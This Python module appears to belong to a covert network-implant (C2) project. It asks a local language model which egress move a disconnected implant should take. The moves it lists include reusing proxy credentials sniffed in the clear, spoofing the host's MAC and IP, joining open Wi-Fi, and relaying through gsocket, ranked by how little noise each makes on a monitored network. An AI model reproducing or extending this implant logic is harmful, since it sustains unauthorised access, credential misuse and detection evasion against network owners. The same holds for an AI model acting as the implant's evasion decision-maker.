#!/usr/bin/env python3
"""One question to a local model, and a validator that does not trust it.

Stage 4 of the way out, and the only part of it that talks to a model at
all. The question is narrow by construction: here is the evidence, here
are the verbs this implant has, which one. Nothing here runs a campaign,
holds a tool or keeps a conversation.

**It ships off.** `c2.way_out.model.enabled` is false in the shipped
config, and that is not timidity: what inference costs on a Pi powered
over PoE -- watts, seconds, thermal headroom -- is not measured anywhere
in this repository and cannot be, because there is no device. The first
operator to switch it on is the first measurement.

**Loopback only, checked twice.** `read_way_out_policy` refuses a
non-loopback endpoint in the beacon's process; this refuses one again in
the scout's. The model exists for this implant's own decision, and a
listener reachable from the target segment would hand it to anyone on the
network the implant is hiding in.

**A bad answer is a refusal, logged, not a crash.** The stance
`read_egress_policy` takes toward a rule that could never fire, for the
sharper reason the design records: the weakest model in the system would
otherwise own the decision with the least room for error, where every
failed attempt is noise on a monitored network.

**What it may not do is not a prompt instruction.** The verbs are
`EGRESS_VERBS`, imported rather than copied -- the scout may import the
beacon and not the other way round -- and `validate` refuses anything
else. The rung *ceiling* is the beacon's arithmetic and is deliberately
not re-implemented here: a second copy of the curve would be a second
place for the ladder to be wrong, and the beacon refuses a rung the curve
has not reached whether the policy or the model proposed it.

**Nothing here raises.** It runs on the scout's publishing clock on a
device nobody can reach.
"""

import json
import logging
import urllib.error
import urllib.request
from typing import Optional

from software.c2.beacon import EGRESS_VERBS

logger = logging.getLogger("raccoon.scout.model")

# The verbs an answer may name. Imported and not copied: `beacon.py` may
# import nothing of this package, so this is the direction the dependency
# runs and there is one vocabulary rather than two.
ALLOWED = EGRESS_VERBS

_LOOPBACK = ("127.0.0.1", "localhost", "::1")
# A reason is for a human reading the trail after the device comes back.
# Bounded, because it is a model's free text landing in a file on the
# implant's disk.
_WHY_MAX = 500

_PROMPT = """You decide one thing for a network implant that has lost its \
connection to its own server, and nothing else.

It is a small device bridging a switch port and a host. No upstream leg has \
delivered for {hours} hour(s). The evidence is below. Choose exactly one of \
the moves it has, in order of how much noise each makes on the network.

What each leg reported this cycle:
{legs}

What the implant's own record flags: {flags}
What the tap saw on the port: {tap}

The moves, quietest first:
{verbs}

Answer with JSON and nothing else:
  {{"verb": "<one of the moves>", "argument": "<optional>", \
"p_success": <0 to 1>, "why": "<one short sentence>"}}

Pick the quietest move the evidence supports. If nothing supports one, \
answer the quietest."""

_VERB_NOTES = {
    "rediscover": "look again for a proxy on this host; changes nothing "
                  "outside it",
    "proxy": "use a proxy this host already found",
    "gsocket": "bring up a relay leg that dials out to a third-party relay "
               "network",
    "credential": "use a proxy account the tap saw in the clear; it may lock "
                  "that account out",
    "portal": "answer a captive portal the way the host answered it",
    "radio": "associate the implant's own radio with an open wireless "
             "network; visible on somebody's controller",
    "identity": "take the downstream host's MAC and IP; a port-security "
                "violation can turn the port off for good",
}


def ask(model: dict, state: dict, tap: dict) -> Optional[dict]:
    """Ask the model which rung to take, or None.

    None for every reason there is not to have an answer: the model is
    off, it has no name, the endpoint is not loopback, nothing answered,
    what came back is not JSON, or what came back is not a move this
    implant has.
    """
    if not (model or {}).get("enabled"):
        return None
    name = (model.get("name") or "").strip()
    if not name:
        logger.warning("way out: the model is enabled and names no model, "
                       "so there is nothing to ask")
        return None
    endpoint = (model.get("endpoint") or "").strip()
    if not _is_loopback(endpoint):
        logger.warning(
            "way out: the model endpoint %r is not loopback, so it was not "
            "asked: the model exists for this implant's own decision, and a "
            "listener the network can reach is one the network can use",
            endpoint)
        return None

    body = json.dumps({
        "model": name,
        "prompt": _prompt(state, tap),
        "stream": False,
        "format": "json",
    }).encode("utf-8")
    request = urllib.request.Request(
        endpoint.rstrip("/") + "/api/generate", data=body, method="POST",
        headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(
                request, timeout=model.get("timeout_seconds", 120)) as reply:
            raw = reply.read()
    except Exception as exc:
        # Every failure is the same failure here: nothing to publish, and
        # the beacon decides on its policy. One line, because this is once
        # per publish on a channel nobody is reading.
        logger.warning("way out: the local model did not answer (%s); the "
                       "policy decides this cycle", exc)
        return None

    try:
        envelope = json.loads(raw.decode("utf-8"))
        answer = json.loads(envelope["response"])
    except Exception as exc:
        logger.warning(
            "way out: the local model's reply could not be read (%s): %.200r",
            exc, raw[:200])
        return None
    return validate(answer, ALLOWED)


def validate(answer, allowed) -> Optional[dict]:
    """The answer as a recommendation, or None with the reason logged.

    `p_success` and `argument` are **dropped** rather than refused when
    they are unusable: the verb is still a usable answer, and the estimate
    is advisory anyway -- the beacon clamps it to +-0.2 of its own prior.
    A verb outside `allowed` is a refusal, because that is the gate.
    """
    if not isinstance(answer, dict):
        logger.warning("way out: the local model answered %.200r, which is "
                       "not a decision", answer)
        return None
    verb = answer.get("verb")
    if not isinstance(verb, str) or verb not in allowed:
        logger.warning(
            "way out: the local model answered %r, which is not one of the "
            "moves this implant has (%s), so it was refused and the policy "
            "decides this cycle", verb, ", ".join(allowed))
        return None
    argument = answer.get("argument")
    why = answer.get("why")
    return {
        "verb": verb,
        "chose": "model",
        "argument": argument if isinstance(argument, str) else "",
        "p_success": _probability(answer.get("p_success")),
        "why": " ".join(str(why).split())[:_WHY_MAX]
               if isinstance(why, str) else "",
    }


def _probability(value) -> Optional[float]:
    """A number strictly between 0 and 1, or None.

    No separate guard against a boolean, unlike the config reader's
    numbers: `isinstance(True, int)` is True, but `float(True)` is 1.0 and
    `float(False)` is 0.0, and the range below excludes both. A line that
    cannot change an answer is a line that cannot be tested.
    """
    if not isinstance(value, (int, float)):
        return None
    number = float(value)
    if number != number or not 0.0 < number < 1.0:
        return None
    return number


def _prompt(state: dict, tap: dict) -> str:
    evidence = state.get("evidence") or {}
    legs = evidence.get("legs") or {}
    return _PROMPT.format(
        hours=state.get("hours_dark", 0),
        legs="\n".join("  %s: %s" % (name, legs[name])
                       for name in sorted(legs)) or "  nothing recorded",
        flags=", ".join(evidence.get("flags") or []) or "none",
        # The whole tap reading, flags included. They are not the same
        # thing as the record's flags above -- the record is what a *leg*
        # learned -- and a prompt that dropped one of the two would ask
        # the model to decide on half the evidence.
        tap=json.dumps(tap or {}, sort_keys=True),
        verbs="\n".join("  %s -- %s" % (verb, _VERB_NOTES.get(verb, ""))
                        for verb in ALLOWED))


def _is_loopback(endpoint: str) -> bool:
    """Whether a URL's host is this host, by text and not by resolution.

    A copy of `beacon.py`'s `_way_out_is_loopback`, and by text for the
    same reason: a name that resolves to 127.0.0.1 today is a name
    somebody else's DNS can move tomorrow, and this is a question the file
    has to settle rather than the network.
    """
    text = (endpoint or "").strip().lower()
    for scheme in ("http://", "https://"):
        if text.startswith(scheme):
            host = text[len(scheme):].split("/", 1)[0].rsplit("@", 1)[-1]
            if host.startswith("["):
                host = host[1:].split("]", 1)[0]
            else:
                host = host.split(":", 1)[0]
            return host in _LOOPBACK
    return False
